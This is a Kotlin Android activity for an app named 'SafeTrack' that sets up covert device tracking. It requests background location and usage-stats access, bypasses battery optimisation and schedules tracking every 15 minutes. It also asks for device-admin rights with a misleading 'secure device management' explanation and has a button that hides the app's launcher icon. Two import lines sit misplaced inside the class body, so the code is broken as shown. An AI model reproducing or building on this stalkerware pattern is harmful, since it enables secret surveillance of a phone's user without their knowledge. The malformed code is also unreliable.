package com.example.safetrack

import java.util.concurrent.TimeUnit

import androidx.work.*

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.work.Constraints
import androidx.work.NetworkType

class MainActivity : AppCompatActivity() {

    private lateinit var btnLocationPerm: Button
    private lateinit var btnUsagePerm: Button
    private lateinit var btnBatteryPerm: Button
    private lateinit var tvStatus: TextView
    private lateinit var btnOpenDashboard: Button
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
    private lateinit var btnHideApp: Button
    private lateinit var btnActivateAdmin: Button

    private fun hideAppIcon(context: Context) {
        val p = context.packageManager
        val componentName = android.content.ComponentName(context, MainActivity::class.java)
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        btnLocationPerm = findViewById(R.id.btnLocationPerm)
        btnUsagePerm = findViewById(R.id.btnUsagePerm)
        btnBatteryPerm = findViewById(R.id.btnBatteryPerm)
        tvStatus = findViewById(R.id.tvStatus)
        btnOpenDashboard = findViewById(R.id.btnOpenDashboard)
        btnHideApp = findViewById(R.id.btnHideApp)
        btnActivateAdmin = findViewById(R.id.btnActivateAdmin)

        btnHideApp.setOnClickListener {
            hideAppIcon(this)
        }

        btnActivateAdmin.setOnClickListener {
            val adminComponent = ComponentName(this, AdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Activate to secure device management.")
            startActivity(intent)
        }

        btnOpenDashboard.setOnClickListener {
            startActivity(Intent(this, DashboardActivity::class.java))
        }

        btnLocationPerm.setOnClickListener {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
                ),
                101
            )
        }

        btnUsagePerm.setOnClickListener {
            UsageTracker.requestPermission(this)
        }

        btnBatteryPerm.setOnClickListener {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }

    override fun onResume() {
        super.onResume()
        updateUIStatus()
    }

    private fun updateUIStatus() {
        val locationGranted = ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val usageGranted = UsageTracker.hasUsageStatsPermission(this)
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        val batteryIgnored = powerManager.isIgnoringBatteryOptimizations(packageName)

        if (locationGranted && usageGranted && batteryIgnored) {
            tvStatus.text = "System Active & Secure"
            btnLocationPerm.isEnabled = false
            btnUsagePerm.isEnabled = false
            btnBatteryPerm.isEnabled = false
            btnOpenDashboard.visibility = android.view.View.VISIBLE
            enqueuePeriodicTrackingWork()
        } else {
            tvStatus.text = "Setup Pending"
            btnLocationPerm.isEnabled = !locationGranted
            btnUsagePerm.isEnabled = !usageGranted
            btnBatteryPerm.isEnabled = !batteryIgnored
            btnOpenDashboard.visibility = android.view.View.GONE
        }
    }

    private fun enqueuePeriodicTrackingWork() {
        val constraints = Constraints.Builder()
            .setRequiresBatteryNotLow(true)
            .build()

        val trackingRequest = PeriodicWorkRequestBuilder<TrackingWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "TrackingWork",
            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
            trackingRequest
        )
    }
}
